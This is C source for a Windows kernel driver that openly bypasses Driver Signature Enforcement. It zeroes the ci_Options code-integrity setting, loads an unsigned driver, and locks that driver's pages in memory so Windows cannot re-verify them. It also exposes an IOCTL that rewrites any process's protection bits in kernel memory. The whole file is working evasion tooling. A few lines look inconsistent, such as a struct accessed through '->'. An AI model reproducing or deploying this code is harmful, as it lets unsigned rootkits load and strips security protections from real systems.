#include <ntifs.h>
#include <ntimage.h>
#define _WIND_DRIVER
#include "defs.h"
#include "wind.h"

static wind_config_t cfg = { sizeof(cfg) };
static KMUTEX ioctl_mutex;

//
// What follows is the meat of the whole DSE bypass.
//
// We temporarily flip the ci_Options to not validate, load driver, flip
// ci_options back.
//
// BUT. Compared to linux, driver pages can be swapped out to disk on windows.
// Worse still, windows will sneakily re-verify pages as they get paged back in.
//
// Obviously our image would fail as the pages will not validate. What we do
// is register a callback for image loading. In there, enumerate all driver sections,
// and lock em in memory via calls to MmLockPagableDataSection -- all the while
// ci_Options is still zero so that everything can be paged in.

static void lock_driver(void *base)
{
	IMAGE_DOS_HEADER *mz = base;
	IMAGE_NT_HEADERS *pe = base + mz->e_lfanew;
	IMAGE_SECTION_HEADER *sec = ((void*)pe) + sizeof(IMAGE_NT_HEADERS);
	DBG("Locking driver @ %p\n", base);
	for (int i = 0; i < pe->FileHeader.NumberOfSections; i++) {
		if (sec[i].SizeOfRawData && sec[i].PointerToRawData) {
			DBG("Locking section %p\n",base + sec[i].VirtualAddress);
			MmLockPagableDataSection(base + sec[i].VirtualAddress);
		}
	}
}

static void NTAPI image_notify(PUNICODE_STRING filename, HANDLE pid, PIMAGE_INFO pinfo)
{
	if (!pinfo->SystemModeImage)
		return;
	lock_driver(pinfo->ImageBase);
}

static void ci_restore()
{
	DBG("current ci_Options=%08x", *((ULONG*)cfg->ci_opt));
	cfg.ci_opt[0] = cfg.ci_guess;
	DBG("now restored ci_Options=%08x", *((ULONG*)cfg->ci_opt));
}

static NTSTATUS driver_sideload(PUNICODE_STRING svc)
{
	NTSTATUS status;

	// register notifier routine
	PsSetLoadImageNotifyRoutine(&image_notify);

	// Clear ci_Options. Daaaaanger zone.
	cfg.ci_opt[0] = 0;

	// Now go fetch.
	status = ZwLoadDriver(svc);

	// Restore ci_Options.
	ci_restore();

	// Remove notifier
	PsRemoveLoadImageNotifyRoutine(&image_notify);

	return status;
}

// The rest is just boring driver boilerplate...

static VOID NTAPI dev_unload(IN PDRIVER_OBJECT self)
{
	DBG("unloading!\n");
	IoDeleteDevice(self->DeviceObject);
}

static NTSTATUS NTAPI dev_open(IN PDEVICE_OBJECT dev, IN PIRP irp)
{
	irp->IoStatus.Status = STATUS_SUCCESS;
	irp->IoStatus.Information = 0;
	IoCompleteRequest(irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;

}

static NTSTATUS NTAPI dev_control(IN PDEVICE_OBJECT dev, IN PIRP irp)
{
	PIO_STACK_LOCATION io_stack;
	ULONG code;
	NTSTATUS status = STATUS_INVALID_PARAMETER;
	void *buf;
	int len;

	KeWaitForMutexObject(&ioctl_mutex, UserRequest, KernelMode, FALSE, NULL);

	io_stack = IoGetCurrentIrpStackLocation(irp);
	if (!io_stack)
		goto out;

	buf = irp->AssociatedIrp.SystemBuffer;
	len = io_stack->Parameters.DeviceIoControl.InputBufferLength;
	code = io_stack->Parameters.DeviceIoControl.IoControlCode;

	irp->IoStatus.Information = 0;

	if (!SeSinglePrivilegeCheck(LUID_SeLoadDriverPrivilege, irp->RequestorMode)) {
		status = STATUS_PRIVILEGE_NOT_HELD;
		goto out;
	}

	status = STATUS_INVALID_BUFFER_SIZE;
	DBG("code=%08x\n",(unsigned)code);


switch (code) {
	case WIND_IOCTL_INSMOD: {
		UNICODE_STRING us;

		// must be at least 2 long, must be even, must terminate with 0
		if ((len < 2) || (len&1) || (*((WCHAR*)(buf+len-2))!=0))
			goto out;

		us.Buffer = (void*)buf;
		us.Length = len-2;
		us.MaximumLength = len;

		status = driver_sideload(&us);
		break;
	}
	case WIND_IOCTL_PROT: {
		wind_prot_t *req = buf;
		int getonly;
		void *proc;
		if (len != sizeof(*req))
			goto out;
		if ((getonly = req->pid < 0))
			req->pid = -req->pid;
		status = PsLookupProcessByProcessId((HANDLE)(req->pid), (PEPROCESS*)&proc);
		if (!NT_SUCCESS(status))
			goto out;
		if (cfg.protbit < 0) {
			WIND_PS_PROTECTION save, *prot = proc + cfg.protofs - 2;
			memcpy(&save, prot, sizeof(save));
			if (!getonly)
				memcpy(prot, &req->prot, sizeof(req->prot));
			memcpy(&req->prot, &save, sizeof(save));
		} else {
			ULONG prev, *prot = proc + cfg.protofs;
			prev = *prot;
			if (!getonly)
				*prot = (prev & (~(1<<cfg.protbit)))
					| ((!!req->prot.Level) << cfg.protbit);
			memset(&req->prot, 0, sizeof(req->prot));
			req->prot.Level = (prev>>cfg.protbit)&1;
		}
		irp->IoStatus.Information = sizeof(*req);
		ObDereferenceObject(proc);
		break;
	}
}
out:;
	KeReleaseMutex(&ioctl_mutex, 0);
	irp->IoStatus.Status = status;
	IoCompleteRequest(irp, IO_NO_INCREMENT);
	return status;
}

NTSTATUS NTAPI ENTRY(driver_entry)(IN PDRIVER_OBJECT self, IN PUNICODE_STRING reg)
{
	PDEVICE_OBJECT dev;
	NTSTATUS status;
	RTL_QUERY_REGISTRY_TABLE tab[2] = {{
		.Flags = RTL_QUERY_REGISTRY_DIRECT
			|RTL_QUERY_REGISTRY_TYPECHECK
			|RTL_QUERY_REGISTRY_REQUIRED
#ifdef NDEBUG
			|RTL_QUERY_REGISTRY_DELETE
#endif
			,
		.Name = L"cfg",
		.EntryContext = &cfg,
		.DefaultType = (REG_BINARY<<RTL_QUERY_REGISTRY_TYPECHECK_SHIFT)
			|REG_NONE
	}};

	status = RtlQueryRegistryValues(0, reg->Buffer, tab, NULL, NULL);
	if (!NT_SUCCESS(status)) {
		DBG("registry read failed=%x",(unsigned)status);
		return status;
	}
	if (cfg.len != sizeof(cfg))
		return STATUS_INVALID_BUFFER_SIZE;

	DBG("initializing driver with:\n"
		" .ci_opt = %p\n"
		" .ci_orig = %p\n"
		" .ci_guess = %02x\n"
		" .protofs = %x\n"
		" .protbit = %d\n", cfg.ci_opt, cfg.ci_orig, cfg.ci_guess,
		cfg.protofs, cfg.protbit);

	self->DriverUnload = dev_unload;
	self->MajorFunction[IRP_MJ_CREATE] = dev_open;
	self->MajorFunction[IRP_MJ_DEVICE_CONTROL] = dev_control;

	status = IoCreateDevice(self, 0, &RTL_STRING(L"\\Device\\" WIND_DEVNAME),
			FILE_DEVICE_UNKNOWN, 0, 0, &dev);

	if (!NT_SUCCESS(status)) {
		DBG("failed to create device=%08x\n",(unsigned)status);
		return status;
	}

	// Page ourselves in too, and restore ci_Options.
	lock_driver(self->DriverStart);
	if (cfg.ci_orig)
		cfg.ci_guess = *cfg.ci_orig;
	ci_restore();

	dev->Flags |= METHOD_BUFFERED;
	dev->Flags &= ~DO_DEVICE_INITIALIZING;

	KeInitializeMutex(&ioctl_mutex, 0);

	DBG("loaded driver\n");
	return status;
}
